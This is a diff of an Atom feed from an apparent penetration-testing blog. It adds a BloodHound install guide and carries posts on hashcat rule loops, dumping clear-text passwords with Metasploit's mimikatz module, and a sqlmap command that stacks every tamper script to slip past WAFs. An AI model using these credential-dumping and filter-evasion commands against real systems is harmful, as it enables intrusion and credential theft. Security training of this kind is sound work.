@@ -1,4 +1,54 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2019-03-04T23:30:03+00:00</updated><id>/feed.xml</id><title type="html">1337Newbs</title><subtitle>Security Blog</subtitle><entry><title type="html">Server Check In and Update</title><link href="/jekyll/update/2019/03/04/Server-Check-in.html" rel="alternate" type="text/html" title="Server Check In and Update" /><published>2019-03-04T00:00:00+00:00</published><updated>2019-03-04T00:00:00+00:00</updated><id>/jekyll/update/2019/03/04/Server-Check-in</id><content type="html" xml:base="/jekyll/update/2019/03/04/Server-Check-in.html">&lt;h1 id=&quot;server-check-in&quot;&gt;Server Check In&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2019-03-05T01:55:05+00:00</updated><id>/feed.xml</id><title type="html">1337Newbs</title><subtitle>Security Blog</subtitle><entry><title type="html">BloodHound Installation</title><link href="/2019/03/05/Bloodhound_install.html" rel="alternate" type="text/html" title="BloodHound Installation" /><published>2019-03-05T00:00:00+00:00</published><updated>2019-03-05T00:00:00+00:00</updated><id>/2019/03/05/Bloodhound_install</id><content type="html" xml:base="/2019/03/05/Bloodhound_install.html">&lt;p&gt;&lt;img src=&quot;/assets/BloodHound-White-on-Red.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h1 id=&quot;how-to-install-bloodhound&quot;&gt;How to install BloodHound&lt;/h1&gt;
+
+&lt;p&gt;This will be a quick tutorial on how to install Bloodhound on Kali Linux. lets get into it.&lt;/p&gt;
+&lt;h3 id=&quot;update-the-system&quot;&gt;Update the system&lt;/h3&gt;
+&lt;p&gt;Get the latest and greatest.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;apt-get update&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;For those of you who feel like living on the edge.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;apt-get dist-upgrade&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;change-neo4j-password&quot;&gt;Change Neo4j password&lt;/h3&gt;
+&lt;p&gt;Launch Neo4j&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;neo4j console&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Browse to the web interface at &lt;strong&gt;http://localhost:7474&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Login with the default credentials&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Username: neo4j&lt;/li&gt;
+  &lt;li&gt;Password: neo4j&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Complete the password change in the browser&lt;/p&gt;
+
+&lt;h3 id=&quot;run-bloodhounnd&quot;&gt;Run BloodHounnd&lt;/h3&gt;
+&lt;p&gt;Open a new terminal&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;bloodhound&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;BloodHound is now running.&lt;/p&gt;
+
+&lt;h3 id=&quot;login&quot;&gt;Login&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Database URL – bolt://127.0.0.1:7687&lt;/li&gt;
+  &lt;li&gt;Username – neo4j&lt;/li&gt;
+  &lt;li&gt;Password – your newly changed password&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Hopefully this was a nice and quick guide to help anyone out there having any issues getting up and running with the awesome tool that is Bloodhound.&lt;/p&gt;</content><author><name></name></author><summary type="html">How to install BloodHound</summary></entry><entry><title type="html">Server Check In</title><link href="/2019/03/04/Server-Check-in.html" rel="alternate" type="text/html" title="Server Check In" /><published>2019-03-04T00:00:00+00:00</published><updated>2019-03-04T00:00:00+00:00</updated><id>/2019/03/04/Server-Check-in</id><content type="html" xml:base="/2019/03/04/Server-Check-in.html">&lt;h1 id=&quot;server-check-in&quot;&gt;Server Check In&lt;/h1&gt;
 &lt;h2 id=&quot;ssh-user-list-generation-from-log-files-on-the-blog&quot;&gt;SSH user list generation from log files on the blog&lt;/h2&gt;
 
 &lt;p&gt;After neglecting the blog for awhile I decided to check in to see if everything was still up and operational. The SSL cert needed updating but it seems everything else was still running strong. I figured I would poke around the logs of the system to make make a user name list from the attempted SSH logins.&lt;/p&gt;
@@ -8,7 +58,7 @@
 &lt;p&gt;Here are the results&lt;br /&gt;
 &lt;a href=&quot;https://1337newbs.com/text/ssh_users.txt&quot;&gt;ssh_users.txt&lt;/a&gt;&lt;br /&gt;
 I also pulled out the URL’s that have been requested in the apache log.&lt;br /&gt;
-&lt;a href=&quot;https://1337newbs.com/text/urls.txt&quot;&gt;urls.txt&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Server Check In SSH user list generation from log files on the blog</summary></entry><entry><title type="html">Loop OclHashcat through multiple rule files</title><link href="/2016/08/13/OclHashcat.html" rel="alternate" type="text/html" title="Loop OclHashcat through multiple rule files" /><published>2016-08-13T00:00:00+00:00</published><updated>2016-08-13T00:00:00+00:00</updated><id>/2016/08/13/OclHashcat</id><content type="html" xml:base="/2016/08/13/OclHashcat.html">&lt;h2 id=&quot;loop-oclhashcat-through-multiple-rule-files&quot;&gt;Loop OclHashcat through multiple rule files&lt;/h2&gt;
+&lt;a href=&quot;https://1337newbs.com/text/urls.txt&quot;&gt;urls.txt&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Server Check In SSH user list generation from log files on the blog</summary></entry><entry><title type="html">OclHashcat Loop</title><link href="/2016/08/13/OclHashcat.html" rel="alternate" type="text/html" title="OclHashcat Loop" /><published>2016-08-13T00:00:00+00:00</published><updated>2016-08-13T00:00:00+00:00</updated><id>/2016/08/13/OclHashcat</id><content type="html" xml:base="/2016/08/13/OclHashcat.html">&lt;h2 id=&quot;loop-oclhashcat-through-multiple-rule-files&quot;&gt;Loop OclHashcat through multiple rule files&lt;/h2&gt;
 
 &lt;ol&gt;
   &lt;li&gt;download latest https://hashcat.net/oclhashcat/#downloadlatest&lt;/li&gt;
@@ -47,7 +97,7 @@ for /f &quot;tokens=*&quot; %%a in (dictionary_list.txt) do (
 pause
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Have fun :)&lt;/p&gt;</content><author><name></name></author><summary type="html">Loop OclHashcat through multiple rule files</summary></entry><entry><title type="html">Dumping clear text passwords</title><link href="/jekyll/update/2016/08/11/mimikatz.html" rel="alternate" type="text/html" title="Dumping clear text passwords" /><published>2016-08-11T00:00:00+00:00</published><updated>2016-08-11T00:00:00+00:00</updated><id>/jekyll/update/2016/08/11/mimikatz</id><content type="html" xml:base="/jekyll/update/2016/08/11/mimikatz.html">&lt;h1 id=&quot;mikatz---dumping-clear-text-passwords&quot;&gt;Mikatz - Dumping clear text passwords&lt;/h1&gt;
+&lt;p&gt;Have fun :)&lt;/p&gt;</content><author><name></name></author><summary type="html">Loop OclHashcat through multiple rule files</summary></entry><entry><title type="html">Mimikatz</title><link href="/2016/08/11/mimikatz.html" rel="alternate" type="text/html" title="Mimikatz" /><published>2016-08-11T00:00:00+00:00</published><updated>2016-08-11T00:00:00+00:00</updated><id>/2016/08/11/mimikatz</id><content type="html" xml:base="/2016/08/11/mimikatz.html">&lt;h1 id=&quot;mikatz---dumping-clear-text-passwords&quot;&gt;Mikatz - Dumping clear text passwords&lt;/h1&gt;
 
 &lt;h2 id=&quot;this-video-will-show-you-how-to-dump-clear-text-passwords-using-the-mimikatz-post-module-within-metasploit&quot;&gt;This video will show you how to dump clear text passwords using the mimikatz post module within Metasploit.&lt;/h2&gt;
 
@@ -63,7 +113,7 @@ set smbpass &amp;lt;password/hash&amp;gt;
 set smbdomain &amp;lt;domain&amp;gt;
 set RHOST &amp;lt;remote-ip&amp;gt;
 set LHOST &amp;lt;local-machine&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Mikatz - Dumping clear text passwords</summary></entry><entry><title type="html">sqlmap Tamper Scripts</title><link href="/jekyll/update/2016/04/18/sqlmap-tamper.html" rel="alternate" type="text/html" title="sqlmap Tamper Scripts" /><published>2016-04-18T00:00:00+00:00</published><updated>2016-04-18T00:00:00+00:00</updated><id>/jekyll/update/2016/04/18/sqlmap-tamper</id><content type="html" xml:base="/jekyll/update/2016/04/18/sqlmap-tamper.html">&lt;h1 id=&quot;sql-map&quot;&gt;sql map&lt;/h1&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Mikatz - Dumping clear text passwords</summary></entry><entry><title type="html">sqlmap tamper scripts</title><link href="/2016/04/18/sqlmap-tamper.html" rel="alternate" type="text/html" title="sqlmap tamper scripts" /><published>2016-04-18T00:00:00+00:00</published><updated>2016-04-18T00:00:00+00:00</updated><id>/2016/04/18/sqlmap-tamper</id><content type="html" xml:base="/2016/04/18/sqlmap-tamper.html">&lt;h1 id=&quot;sql-map&quot;&gt;sql map&lt;/h1&gt;
 &lt;p&gt;You all prob know about SQLmap’s ability to load tamper script rules to evade filters and WAF’s but what I didn’t know until recently was that you can use all of them in one line like so:&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u 'http://www.site.com:80/search.cmd?form_state=1’ --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
